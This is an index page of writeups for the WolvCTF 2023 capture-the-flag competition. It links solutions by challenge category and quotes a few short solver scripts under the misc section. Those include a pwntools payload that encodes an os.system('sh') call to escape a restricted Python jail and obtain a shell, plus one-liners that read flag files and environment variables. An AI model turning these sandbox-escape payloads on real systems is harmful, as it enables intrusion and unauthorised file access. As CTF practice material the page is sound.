---
title: "WolvCTF 2023"
weight: 0
---
# WolvCTF 2023

- [CTFTime](https://ctftime.org/event/1866)
- [GitHub Repository](https://github.com/WolvSec/WolvCtf-2023-Challenges-Public)

## **crypto**
### theyseemerolling
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### keyexchange
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- https://github.com/5t0n3/ctf-writeups/tree/main/2023-wolvctf/crypto/keyexchange
### Galois-t is this?
- https://github.com/5t0n3/ctf-writeups/tree/main/2023-wolvctf/crypto/galois-t_is_this
### Z2kDH
- https://github.com/nass15456/CTFs/blob/main/WolvCTF/Z2kDH.md
### Down Under
- https://github.com/5t0n3/ctf-writeups/tree/main/2023-wolvctf/crypto/downunder
### Tealy Man


## **forensics**
### Elytra
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Dino Trading
- https://chrootcommit.github.io/WolvCtf2023
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Forensics-Dino_Trading-Easy/solve.md
### important_notes
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Employee 427: Compromised
- https://chrootcommit.github.io/WolvCtf2023
- https://blog.hamayanhamayan.com/entry/2023/03/20/212836
- https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Forensics-Employee_427Compromised-Easy/solve.md
### Employee 427: Locate
- https://chrootcommit.github.io/WolvCtf2023
- https://blog.hamayanhamayan.com/entry/2023/03/20/212836
- https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Forensics-Employee_427Locate-Medium/solve.md
### Employee 428: Recovery


## **misc**
### Escaped
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### We Will Rock You
- https://chrootcommit.github.io/WolvCtf2023
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Limited Characters
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- yuzu#0233
  ```python
  from pwn import *

  payload = '__import__("os").system("sh")'

  def _(num):
      return "+".join(["1" for i in range(num)])

  res = []
  for char in payload:
      res.append(f'chr({_(ord(char))})')

  payload = '+'.join(res) + "+repr(' ()+,.1<[]_cdehijlmnoprsy')[1]"
  p = remote('limited-characters.wolvctf.io', 1337)
  p.sendline(payload)
  p.interactive()
  ```
### Smuggler
- https://www.youtube.com/watch?v=OWSoZHIOdVM
### Abstract Art

### yellsatjavascript
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469

- xl00t#5697:
  ```javascript
  log = console["log"];
  buf = new Buffer("ZmxhZw==",'base64')["toString"]();
  log(process['env'][buf]);
  ```


### yellsatpython
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- xl00t#5697:
  ```python
  next(open("/home/user/flag"+chr(46)+"txt))
  ```
- yuzu#0233
  ```python
  from pwn import *

  r = remote('yellsatpython.wolvctf.io', 1337)
  payload = "next(open('flag\\x2etxt'))"
  r.sendline(payload)
  r.interactive()
  ```
### yellsatbefunge1
- Silicate#4370
  ```bash
  v###############v###############< 
  ```
### yellsatbefunge2
### yellsatbefunge3
### yellsatbefunge4


## **osint**
### WannaFlag I: An Introduction
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/
### WannaFlag II: Payments
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/
### WannaFlag III: Infiltration
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/
### WannaFlag IV: Exfiltration
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/
### WannaFlag V: The Mastermind
- https://enscribe.dev/ctfs/wolv23/osint/wannaflag/


## **pwn**
### Baby PWN
### Cat
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Squirrel Feeding
- https://ctf.krloer.com/writeups/wolvctf/squirrel_feeding/
### wtml
### echo2
- https://ctf.krloer.com/writeups/wolvctf/echo2/


## **rev**
### child re
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- https://fallingskies22.github.io/post/wolvctf-2023-reverse-child-re/
### baby re
- https://chrootcommit.github.io/WolvCtf2023
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Homework Help
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
- https://github.com/Nambers/ctf-writeups/blob/main/WolvCTF-2023/Reverse-Homework_Help-Easy-Medium/solve.md
### 64r2
### yowhatsthepassword
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### ej
- https://nicholas-wei.github.io/2023/03/20/ej/
- https://github.com/autoexecbat-ctf/write-ups/tree/main/wolvctf2023/ej


## **web**
### Charlotte's Web
- https://chrootcommit.github.io/WolvCtf2023
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Hidden CSS
### Adversal
- https://github.com/Nolan1324/adversal-wolvctf-2023/tree/main/solvers
### Filter Madness
### Zombie 101
- https://chrootcommit.github.io/WolvCtf2023
- https://www.youtube.com/watch?v=HzJd4qxI1pc
- https://www.bugsbunnies.tk/2023/03/18/zombie.html
- https://gist.github.com/shinmai/5720d1f0a214d0878cfb530eb975c469
### Zombie 201
- https://chrootcommit.github.io/WolvCtf2023
- https://www.bugsbunnies.tk/2023/03/18/zombie.html
### Zombie 301
- https://chrootcommit.github.io/WolvCtf2023
- https://www.bugsbunnies.tk/2023/03/18/zombie.html
- https://xl00t.fr/posts/wolvctf-2023-zombie-301-401/
### Zombie 401
- https://chrootcommit.github.io/WolvCtf2023
- https://www.bugsbunnies.tk/2023/03/18/zombie.html
- https://xl00t.fr/posts/wolvctf-2023-zombie-301-401/